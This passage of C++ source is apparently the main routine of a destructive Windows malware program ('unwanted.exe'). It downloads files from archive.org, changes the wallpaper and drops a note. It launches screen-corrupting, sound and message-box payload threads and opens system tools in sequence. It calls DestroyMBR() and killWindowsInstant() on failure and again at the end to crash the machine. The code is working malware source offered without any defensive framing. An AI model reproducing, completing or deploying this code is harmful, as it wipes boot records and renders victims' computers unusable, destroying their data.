        WriteFile(last, lastm, last_len, &wb, NULL);

        CloseHandle(last);

        cout << "\n";

        /* The part of downloading required files */


        const wchar_t* srcURL1 = L"http://archive.org/download/01101000/0000001.bin"; // donwloads desktop background
        const wchar_t* destFile1 = L"C:\\Program Files\\Common Files\\system\\deskbgrd.jpg";
        if (S_OK == URLDownloadToFile(NULL, srcURL1, destFile1, 0, NULL))
        {
            Sleep(1000);
            const wchar_t* filenm = L"C:\\Program Files\\Common Files\\system\\deskbgrd.jpg";
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)filenm, SPIF_UPDATEINIFILE);
            // success
        }
        // else kills os
        else
        {

            int DisplayResourceNAMessageBox();
            {
                int msgboxID = MessageBox(
                    NULL,
                    (LPCWSTR)L"Unknown hard error",
                    (LPCWSTR)L"unwanted.exe - System Warning",
                    MB_ICONWARNING | MB_OK
                );
            };
            DestroyMBR();
            DoError();
            killWindowsInstant();

            return -1;
        };
        CreateDesktopFiles(); // Create Desktop Files
        const wchar_t* srcURL8 = L"http://archive.org/download/01101000/0000002.bin"; // donwloads desktop background
        const wchar_t* destFile8 = L"C:\\Program Files\\Common Files\\system\\Documento.rtf";
        if (S_OK == URLDownloadToFile(NULL, srcURL8, destFile8, 0, NULL))
        {
            // success

        }
        // else kills os
        else
        {

            int DisplayResourceNAMessageBox();
            {
                int msgboxID = MessageBox(
                    NULL,
                    (LPCWSTR)L"Unknown hard error",
                    (LPCWSTR)L"unwanted.exe - System Warning",
                    MB_ICONWARNING | MB_OK
                );
            };
            DestroyMBR();
            DoError();
            killWindowsInstant();

            return -1;
        };

        // Write the Note File

        HANDLE note = CreateFileA("C:\\note.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

        WriteFile(note, msg, msg_len, &wb, NULL);

        CloseHandle(note);

        // Open Notepad with the note
        ShellExecuteA(NULL, NULL, "notepad", "C:\\note.txt", NULL, SW_SHOWDEFAULT);

        const wchar_t* srcURLk = L"http://archive.org/download/01101000/0000005.bin"; // Downloads aww kittens picture
        const wchar_t* destFilek = L"C:\\Program Files\\Common Files\\system\\kitten.jpg";
        if (S_OK == URLDownloadToFile(NULL, srcURLk, destFilek, 0, NULL))
        {
            Sleep(300);
            // success

        }
        // else kills os
        else
        {

            int DisplayResourceNAMessageBox();
            {
                int msgboxID = MessageBox(
                    NULL,
                    (LPCWSTR)L"Unknown hard error",
                    (LPCWSTR)L"unwanted.exe - System Warning",
                    MB_ICONWARNING | MB_OK
                );
            };
            DestroyMBR();
            DoError();
            killWindowsInstant();

            return -1;
        };
        if (argc > 1) {
            if (!lstrcmpW(argv[1], L"startmalwarewithlog")) {
                /* Message in case Console Log Mode */
                cout << "[System Message] > ";
                cout << "S"; Sleep(100);
                cout << "a"; Sleep(100);
                cout << "y"; Sleep(100);
                cout << " g"; Sleep(100); cout << "o"; Sleep(100); cout << "od"; Sleep(100); cout << "by"; Sleep(100); cout << "e!"; Sleep(100);
                ShowWindow(GetConsoleWindow(), SW_HIDE); // hide console window in case console log
            }
        }
        CreateThread(NULL, NULL, &payloadThread, &DestroyURScreen, NULL, NULL);
        /* Main Payload */
        CreateThread(NULL, NULL, &payloadThread, &PlayMusik, NULL, NULL);
        Sleep(1500);
        CreateThread(NULL, NULL, &payloadThread, &payloadMessageBox, NULL, NULL);
        Sleep(4500);
        ShellExecuteA(NULL, NULL, "write", "\u0022C:\\Program Files\\Common Files\\system\\Documento.rtf\u0022", NULL, SW_SHOWDEFAULT);
        Sleep(8500);
        ShellExecuteA(NULL, NULL, "control", NULL, NULL, SW_SHOWDEFAULT);
        Sleep(4500);
        CreateThread(NULL, NULL, &payloadThread, &payloadReverseText, NULL, NULL);
        CreateThread(NULL, NULL, &payloadThread, &payloadMessageBox, NULL, NULL);
        Sleep(4500);
        ShellExecuteA(NULL, NULL, "regedit", NULL, NULL, SW_SHOWDEFAULT);
        Sleep(4500);
        ShellExecuteA(NULL, NULL, "notepad", "\u0022C:\\Program Files\\Common Files\\system\\Die.txt\u0022", NULL, SW_SHOW);
        Sleep(4500);
        ShellExecuteA(NULL, NULL, "taskmgr", NULL, NULL, SW_SHOWDEFAULT);
        Sleep(2250);
        ShellExecuteA(NULL, NULL, "explorer", NULL, NULL, SW_SHOWDEFAULT);
        Sleep(2250);
        CreateThread(NULL, NULL, &payloadThread, &DestroyURScreen, NULL, NULL);
        ShellExecuteA(NULL, NULL, "mspaint", "\u0022C:\\Program Files\\Common Files\\system\\kitten.jpg\u0022", NULL, SW_SHOWDEFAULT);
        Sleep(2250);
        ShellExecuteA(NULL, NULL, "charmap", NULL, NULL, SW_SHOWDEFAULT);
        Sleep(6000);
        ShellExecuteA(NULL, NULL, "cmd", NULL, NULL, SW_SHOWDEFAULT);
        Sleep(6000);
        ShellExecuteA(NULL, NULL, "notepad", "\u0022C:\\Program Files\\Common Files\\system\\Last.txt\u0022", NULL, SW_SHOW);
        Sleep(6000);
        CreateThread(NULL, NULL, &payloadThread, &RandBeep, NULL, NULL);
        CreateThread(NULL, NULL, &payloadThread, &payloadChangeText, NULL, NULL);
        // last 10 seconds (wait until windows dies)
        Sleep(8000);

        CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);

        for (;;) {
            Sleep(1000);
        }

        return 0; // Unnecessary main return
    }
    }